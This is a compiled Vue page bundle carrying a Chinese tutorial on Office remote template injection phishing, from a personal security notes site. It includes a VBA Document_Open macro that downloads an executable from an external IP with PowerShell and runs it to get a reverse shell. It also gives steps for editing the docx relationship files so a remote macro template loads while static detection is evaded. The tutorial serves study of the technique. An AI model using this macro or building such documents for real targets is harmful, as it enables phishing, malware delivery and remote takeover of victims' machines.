import{_ as t}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as i,a,o as s}from"./app-CFt4SMiv.js";const p={};function o(n,e){return s(),i("div",null,e[0]||(e[0]=[a(`<h1 id="office关系模板注入" tabindex="-1"><a class="header-anchor" href="#office关系模板注入"><span>Office关系模板注入</span></a></h1><blockquote><p><a href="https://cloud.tencent.com/developer/article/1917641" target="_blank" rel="noopener noreferrer">干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p><a href="https://www.freebuf.com/articles/network/317116.html" target="_blank" rel="noopener noreferrer">wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户</a></p><p><a href="https://support.microsoft.com/zh-cn/topic/%E5%B7%B2%E9%98%BB%E6%AD%A2%E6%9C%89%E6%BD%9C%E5%9C%A8%E5%8D%B1%E9%99%A9%E7%9A%84%E5%AE%8F-0952faa0-37e7-4316-b61d-5b5ed6024216" target="_blank" rel="noopener noreferrer">已阻止有潜在危险的宏 - Microsoft 支持</a></p><p><a href="https://www.cisco.com/c/dam/m/zh_cn/products/security/talos/template-injection.pdf" target="_blank" rel="noopener noreferrer">利用模板注入攻击关键基础设施 (cisco.com)</a></p></blockquote><ul><li>测试环境: Win10+Office365</li></ul><p>利用Word文档加载附加模板时的缺陷所发起的恶意请求，而达到的攻击目的，当目标用户点开攻击者发送的恶意Word文档就可以通过向远程服务器发送恶意请求的方式，然后加载模板执行恶意模板的宏。</p><p>发送的文档本身不带恶意代码，所以能过很多静态检测。只需要在远程DOTM文档中编写宏病毒或者木马即可。</p><p>制作一个宏钓鱼的文档挂载到 HTTP 服务器上, 例如前面的 VBA 宏调 Powershell 下载与执行文件达成反弹shell</p><div class="language-vb line-numbers-mode" data-highlighter="shiki" data-ext="vb" data-title="vb" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">Private Sub </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Document_Open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">Call </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Shell</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Environ</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">$(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;COMSPEC&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) &amp; </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot; /c powershell.exe curl http://100.1.1.131:8000/download/msedge.exe -o msedge.exe &amp;&amp; msedge.exe&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> vbNormalFocus</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">End Sub</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>选定目标 word 文档后将其后缀名改成 <code>.zip</code> 并解压</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609857.png" alt="image-20240611053738672"></p><p>整体目录结构如下:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609303.png" alt="image-20240611053804070"></p><p>制作关系模板注入文档主要需要修改两个文件</p><ul><li><p><code>\\word\\_rels\\settings.xml.rels</code></p><p>一般 <code>word/_rels</code> 文档里可能只有 <code>document.xml.rels</code> 没有 <code>settings.xml.rels</code>, 此时需要新建一个 <code>settings.xml.rels</code> 文档</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609832.png" alt="image-20240611054035175"></p><p>几个关键点</p><ul><li><p><code>Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot;</code></p><p>最后一定要是 <code>attachedTemplate</code> 定义关系模板</p></li><li><p><code>TargetMode</code> 要是 <code>External</code> 外部模板定义</p></li></ul></li><li><p><code>\\word\\settings.xml</code></p><p>在 <code>w:settings</code> 属性中定义外部模板</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609115.png" alt="image-20240611054105685"></p></li></ul><p>将目录重新打包成 zip 并重命名为 docx 文档</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609548.png" alt="image-20240611055158981"></p><p>到这里模板注入的钓鱼文档就制作好了, 但是由于这里外联模板直接填的ip是不受信任的, 因此这里即便打开了也不会正常加载外部模板, 需要添加受信任站点</p><blockquote><p><a href="https://support.microsoft.com/zh-cn/topic/%E5%B7%B2%E9%98%BB%E6%AD%A2%E6%9C%89%E6%BD%9C%E5%9C%A8%E5%8D%B1%E9%99%A9%E7%9A%84%E5%AE%8F-0952faa0-37e7-4316-b61d-5b5ed6024216" target="_blank" rel="noopener noreferrer">已阻止有潜在危险的宏 - Microsoft 支持</a></p></blockquote><p>打开 <code>Internet选项-&gt;受信任的站点-&gt;站点</code> 添加目标主机即可</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406111038830.png" alt="image-20240611103839273"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406111039797.png" alt="image-20240611103954699"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406111041875.png" alt="image-20240611104113796"></p><hr><p>打开该文档便会下载外部模板文档并执行宏代码达成反弹shell:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609052.png" alt="image-20240611060918908"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202406110609182.png" alt="image-20240611060910931"></p><hr><h2 id="相关链接" tabindex="-1"><a class="header-anchor" href="#相关链接"><span>相关链接</span></a></h2><ul><li><a href="https://xz.aliyun.com/t/10339?time__1311=Cqjx2QD%3DiteWqGNDQimOgbtDtt0QtDReOYD" target="_blank" rel="noopener noreferrer">常见钓鱼招式 - 先知社区 (aliyun.com)</a></li></ul><hr>`,29)]))}const c=t(p,[["render",o],["__file","index.html.vue"]]),m=JSON.parse('{"path":"/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/%E5%85%B3%E7%B3%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","title":"Office关系模板注入","lang":"zh-CN","frontmatter":{"category":["网络安全","钓鱼"],"tags":["钓鱼附件","Office","关系模板注入"],"description":"Office关系模板注入 干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com) wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户 已阻止有潜在危险的宏 - Microsoft 支持 利用模板注入攻击关键基础设施 (cisco.com) 测试环境: Win10+Office365 ...","head":[["meta",{"property":"og:url","content":"https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E9%92%93%E9%B1%BC/%E9%92%93%E9%B1%BC%E9%99%84%E4%BB%B6/Office/%E5%85%B3%E7%B3%BB%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"}],["meta",{"property":"og:site_name","content":"DailyNotes"}],["meta",{"property":"og:title","content":"Office关系模板注入"}],["meta",{"property":"og:description","content":"Office关系模板注入 干货 | Office文档钓鱼的实战和免杀技巧-腾讯云开发者社区-腾讯云 (tencent.com) wps和office宏钓鱼从认识到免杀 - FreeBuf网络安全行业门户 已阻止有潜在危险的宏 - Microsoft 支持 利用模板注入攻击关键基础设施 (cisco.com) 测试环境: Win10+Office365 ..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"http://cdn.ayusummer233.top/DailyNotes/202406110609857.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-04-16T10:17:38.000Z"}],["meta",{"property":"article:tag","content":"钓鱼附件"}],["meta",{"property":"article:tag","content":"Office"}],["meta",{"property":"article:tag","content":"关系模板注入"}],["meta",{"property":"article:modified_time","content":"2025-04-16T10:17:38.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Office关系模板注入\\",\\"image\\":[\\"http://cdn.ayusummer233.top/DailyNotes/202406110609857.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406110609303.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406110609832.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406110609115.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406110609548.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406111038830.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406111039797.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406111041875.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406110609052.png\\",\\"http://cdn.ayusummer233.top/DailyNotes/202406110609182.png\\"],\\"dateModified\\":\\"2025-04-16T10:17:38.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"咸鱼型233\\",\\"url\\":\\"https://233official.github.io/dailynotes/\\"}]}"]],"date":"2024-06-04T10:51:44.000Z"},"headers":[{"level":2,"title":"相关链接","slug":"相关链接","link":"#相关链接","children":[]}],"git":{"createdTime":1717498304000,"updatedTime":1744798658000,"contributors":[{"name":"233Mac","username":"233Mac","email":"ayusummer233@vip.qq.com","commits":2,"url":"https://github.com/233Mac"},{"name":"233","username":"233","email":"ayusummer233@gmail.com","commits":4,"url":"https://github.com/233"}]},"readingTime":{"minutes":2.2,"words":661},"filePathRelative":"网络安全/钓鱼/钓鱼附件/Office/关系模板注入/index.md","localizedDate":"2024年6月4日","excerpt":"","autoDesc":true}');export{c as comp,m as data};
